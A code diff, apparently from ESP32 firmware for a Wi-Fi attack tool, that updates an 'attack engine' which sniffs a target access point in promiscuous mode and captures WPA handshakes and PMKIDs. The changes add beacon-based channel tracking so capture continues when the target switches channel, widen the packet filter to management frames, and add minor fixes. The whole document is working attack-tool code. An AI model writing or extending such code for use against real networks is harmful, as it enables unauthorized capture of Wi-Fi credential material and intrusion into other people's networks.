@@ -1,35 +1,63 @@
 #include <string.h>
 #include "esp_wifi.h"
 #include "esp_log.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "freertos/timers.h"
 #include "esp_random.h"
 #include "libwifi.h"
 #include "utils.h"
+#include "passwordMng.h"
 #include "wifi_attacks.h"
 
 #define CLIENT_SEM_WAIT 10
 #define TARGET_SEM_WAIT 10
+#define BEACON_RX_TIMEOUT 2000
 
 static const char *TAG = "WIFI_ATTACKS";
 
 static client_t clients[MAX_CLIENTS] = { 0 };
 static SemaphoreHandle_t clients_semaphore;
 static SemaphoreHandle_t target_semaphore;
+static TimerHandle_t beacon_track_timer_handle = NULL;
 static uint8_t num_clients = 0;
 static target_info_t target = { 0 };
 static handshake_info_t handshake_info = { 0 };
 
 
-static bool isMacZero(uint8_t *mac)
+/**
+ * @brief If no beacond is received from ap for BEACON_RX_TIMEOUT ms switch channel
+ * 
+ * @param TimerHandle_t xTimer 
+ */
+static void hopping_timer_callback(TimerHandle_t xTimer)
 {
-    uint8_t zero_mac[6] = {0};
-    return memcmp(mac, zero_mac, 6) == 0;
+    if(xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
+    {
+        target.channel = getNextChannel(target.channel);
+        esp_wifi_deauth_sta(0);
+        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
+        ESP_LOGW(TAG, "BEACON timeout, ap is offline or changed channel. Try switching channel to %d...", target.channel);
+        handshake_info.pmkid_captured = false;
+        handshake_info.handshake_captured = false;
+        xSemaphoreGive(target_semaphore);
+    }
 }
 
 
+/**
+ * @brief Get the target info copy object
+ * 
+ * @param dest 
+ * @param src 
+ * @return uint8_t 
+ */
 static uint8_t get_target_info_copy(target_info_t *dest, target_info_t *src)
 {
-    if(xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(TARGET_SEM_WAIT)) == pdTRUE) {
+    if(xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(TARGET_SEM_WAIT)) == pdTRUE) 
+    {
         memcpy(dest, src, sizeof(target_info_t));
+        xSemaphoreGive(target_semaphore);
         return true;
     }
     else {
@@ -38,6 +66,11 @@ static uint8_t get_target_info_copy(target_info_t *dest, target_info_t *src)
 }
 
 
+/**
+ * @brief Add associated client to clients list
+ * 
+ * @param mac 
+ */
 static void add_client_to_list(const uint8_t *mac) 
 {
     if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) == pdTRUE) 
@@ -77,13 +110,27 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
         return;
     }
 
-    /* Ensure the frame is of type DATA */
+    /* For better reading */
+    const uint8_t *dest_mac = (uint8_t *)&frame.header.mgmt_ordered.addr1;  // Destination MAC address
+    const uint8_t *src_mac = (uint8_t *)&frame.header.mgmt_ordered.addr2;  // Source MAC address
+    const uint8_t *bssid = (uint8_t *)&frame.header.mgmt_ordered.addr3;    // BSSID
+
+    /* Capture beacon frames */
+    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_BEACON)
+    {
+        if( isMacBroadcast(dest_mac) == true && memcmp(src_mac, target.bssid, 6) == 0 )
+        {
+            /* Reset beacon timeout timer */
+            if( beacon_track_timer_handle != NULL )
+            {
+                xTimerReset(beacon_track_timer_handle, 0);
+            }
+        }
+    }
+
+    /* Check frame type data for EAPOLs */
     if (frame.frame_control.type == TYPE_DATA)
     {
-        const uint8_t *dest_mac = (uint8_t *)&frame.header.mgmt_ordered.addr1;  // Destination MAC address
-        const uint8_t *src_mac = (uint8_t *)&frame.header.mgmt_ordered.addr2;  // Source MAC address
-        const uint8_t *bssid = (uint8_t *)&frame.header.mgmt_ordered.addr3;    // BSSID
-
         if( libwifi_check_wpa_handshake(&frame) == true && handshake_info.handshake_captured == false )
         {
             /* Extract WPA data from the frame */
@@ -152,6 +199,12 @@ cleanup:
 
 void wifi_attack_engine_start(target_info_t *_target)
 {
+    /* Check pointer */
+    if( _target == NULL )
+    {
+        return;
+    }
+
     /* Init semaphore */
     if (clients_semaphore == NULL) 
     {
@@ -173,12 +226,20 @@ void wifi_attack_engine_start(target_info_t *_target)
     /* Start wifi promiscuos mode */
     esp_wifi_set_promiscuous(true);
     wifi_promiscuous_filter_t filter = {
-        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
     };
     esp_wifi_set_promiscuous_filter(&filter);
     filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
     esp_wifi_set_promiscuous_ctrl_filter(&filter);
     esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+
+    /* Start beacon timer for channel tracking */
+    beacon_track_timer_handle = xTimerCreate("beacon_tracking_timer", pdMS_TO_TICKS(BEACON_RX_TIMEOUT), pdTRUE, NULL, hopping_timer_callback);
+    if (beacon_track_timer_handle == NULL) {
+        ESP_LOGE(TAG, "Errore nella creazione del timer");
+        return;
+    }
+    xTimerStart(beacon_track_timer_handle, 0);
 }
 
 
@@ -204,6 +265,11 @@ void wifi_attack_engine_stop(void)
     memset(clients, 0, sizeof(clients));
     memset(&target, 0, sizeof(target_info_t));
     memset(&handshake_info, 0, sizeof(handshake_info_t));
+
+    /* Delete channel tracking timer */
+    xTimerStop(beacon_track_timer_handle, 0);
+    xTimerDelete(beacon_track_timer_handle, 0);
+    beacon_track_timer_handle = NULL;
 }
 
 
